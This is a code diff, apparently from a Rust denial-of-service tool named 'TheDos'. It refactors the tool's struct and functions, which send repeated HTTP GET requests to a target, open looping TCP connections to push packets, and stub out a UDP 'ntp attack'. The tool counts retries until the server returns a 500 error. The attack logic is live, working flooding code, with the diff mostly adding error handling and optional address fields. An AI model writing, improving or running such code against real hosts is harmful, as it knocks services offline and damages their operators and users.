@@ -29,8 +29,8 @@ pub struct TheDos{
     pub safe: u8,
     pub host: String,
     pub url: String,
-    pub tcp_addr: String,
-    pub udp_addr: String,
+    pub tcp_addr: Option<String>,
+    pub udp_addr: Option<String>,
     pub retries: u128,
     pub status_code: u16,
 }
@@ -39,14 +39,14 @@ pub struct TheDos{
 impl TheDos{
 
 
-    pub fn new(url: &str, tcp_addr: &str, udp_addr: &str, host: &str) -> Self{
+    pub fn new(url: &str, tcp_addr: Option<String>, udp_addr: Option<String>, host: &str) -> Self{
         Self{
             flag: 0,
             safe: 0,
             host: host.to_string(),
             url: url.to_string(),
-            tcp_addr: tcp_addr.to_string(),
-            udp_addr: udp_addr.to_string(),
+            tcp_addr,
+            udp_addr,
             retries: 0,
             status_code: 0,
         }
@@ -93,6 +93,7 @@ impl TheDos{
     }
 
     pub fn monitor_attack(&self){
+        info!("monitoring the attack");
         let mut last_try = self.retries;
         while self.flag == 0{
             if last_try + 100 < self.retries && last_try != self.retries{
@@ -156,16 +157,27 @@ impl TheDos{
         // let res = block_on(client.request(req)).unwrap(); 
         
         info!("sending GET of {} to {}", uri, self.url);
-        let res = client.request(req).await.unwrap();
-        self.monitor_attack(); // Let Me Cry For You 
-        
-        if res.status() == 500{
-            self.flag = 1;
-            self.status_code = 500;
+        let res = client.request(req).await;
+
+        if let Err(e) = res{
+            error!("can't send to {} due to {}", self.url, e);
             process::exit(1);
-        } else{
-            self.retries+=1;
+        } else {
+            
+            let res = res.unwrap();
+            self.monitor_attack(); // Let Me Cry For You 
+        
+            if res.status() == 500{
+                self.flag = 1;
+                self.status_code = 500;
+                process::exit(1);
+            } else{
+                self.retries+=1;
+            }
+                
         }
+
+
         
     
     }
@@ -179,9 +191,9 @@ impl TheDos{
         loop{
 
             time+=1;
-            let tcp_addr = self.tcp_addr.clone();
+            let tcp_addr = self.tcp_addr.clone().unwrap();
             tokio::spawn(async move{ 
-                match TcpStream::connect(tcp_addr).await{
+                match TcpStream::connect(tcp_addr.as_str()).await{
                     Ok(mut stream) => {
     
                         info!("sending packet {}", time);
@@ -205,7 +217,7 @@ impl TheDos{
     }
     
     
-    pub async fn udpcall(){
+    pub async fn udpcall(&mut self){
         
         // ntp attack
         // tokio udp call
